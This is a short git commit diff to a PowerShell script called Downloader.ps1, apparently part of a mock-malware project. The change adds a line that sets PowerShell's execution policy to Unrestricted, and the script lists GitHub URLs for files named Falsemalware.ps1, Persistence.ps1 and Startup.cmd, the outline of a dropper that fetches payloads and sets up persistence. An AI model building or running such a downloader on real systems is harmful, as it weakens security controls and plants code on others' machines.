fca463dbd204db81e3b5c702b236e901b31a3237
Freecil <128537217+Freecil@users.noreply.github.com>
2023-04-10 11:32:05 +0200

    Update Downloader.ps1

--- Downloader.ps1
+++ Downloader.ps1
@@ -1,4 +1,4 @@
-
+Set-ExecutionPolicy Unrestricted
 $url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
 $url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
 $url4 = "https://github.com/Freecil/Prjoetls/blob/b7721dec175d66f83df5febcb78595dc1f229fe6/Startup.cmd"
